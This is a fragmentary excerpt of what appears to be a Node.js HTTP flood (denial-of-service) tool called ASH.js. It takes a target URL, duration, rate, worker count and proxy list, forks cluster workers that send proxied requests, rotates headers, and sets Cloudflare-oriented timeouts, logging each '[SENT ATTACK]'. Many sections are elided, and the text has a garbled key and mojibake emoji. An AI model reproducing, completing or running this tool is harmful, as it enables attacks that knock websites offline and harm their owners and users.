...
if (process.argv.length < 7){console.log("\x1b[32m" + `
 node ASH.js https://google.com 800 1000 20 .\proxy.txt
\x1b[0m`); 
process.exit();}
const headers = {};
...
const getCurrentTime = () => {
 ...
 Promise.race([axiosPromise, timeoutPromise])
   .then((response) => {
     ...
     console.log(`${getCurrentTime()} [ SENT ATTACK ]  \x1b[32mSTATUS\x1b[0m \x1b[37m:\x1b[0m ${getTitleFromHTML(data)} (\x1b[32m${status}\x1b[0m)`);
   })
   .catch((error) => {
     if (error.message === 'REQUEST TIMEOUT') {
       console.log(`${getCurrentTime()} [SENT ATTACK]  \x1b[31mREQUEST TIMEOUT\x1b[0m`);
     } else if (error.response) {
       const extractedTitle = getTitleFromHTML(error.response.data);
       console.log(`${getCurrentTime()} [SENT ATTACK]  \x1b[32mSTATUS\x1b[0m \x1b[37m:\x1b[0m ${extractedTitle}`);
     } else {
       console.log(`${getCurrentTime()} [SENT ATTACK]  ${error.message}`);
     }
   });
}
...
function getTitleFromHTML(html) {
 ...
 return '\x1b[31mNOT FOUND\x1b[0m';
}
...
THE ATTACK HAS STARTING ðŸŸ¢
PRESS CTRL+Z TO STOP ðŸ›‘
\x1b[0m`);
 
 for (let i = 1; i <= process.argv[5]; i++){
   cluster.fork();
   console.log(`${getCurrentTime()} SENT ATTACK]  \x1b[33mPROXY ${i} STARTED\x1b[0m`);
 }
 console.log(`${getCurrentTime()} [SENT ATTACK]  \x1b[32mSTARTED RUNNING\x1b[0m`);
 setInterval(getStatus, 2000);
 setTimeout(() => {
   console.log(`${getCurrentTime()} [SENT ATTACK]  \x1b[31mTHE ATTACK IS OVER\x1b[0m`);
   process.exit(1);
 }, process.argv[3] * 1000);
} 
...
encoding_header = [
 ...
 'gzip;q=1.0, identity;q=0.5, *;q=0',
 'gzip, br;q=1.0, deflate;q=0.5',
 'gzip, deflate, exi, sdch',
...
class NetSocket {
 ...
 HTTP(options, callback) {
    ...
    connection.on("error", error => {
        connection.destroy();
        return callback(undefined, "mistake: " + error);
    });
}
}
   ...
   process.on('unhandledRejection', function(er) {
    ...
    Socker.HTTP(proxyOptions, (connection, error) => {
        ...
        const tlsOptions = {
           ...
           maxRedirects: 100,
           clientTimeout: 50000,
           clientlareMaxTimeout: 100000,
           cloudflareTimeout: 50000,
           cloudflareMaxTimeout: 300000,
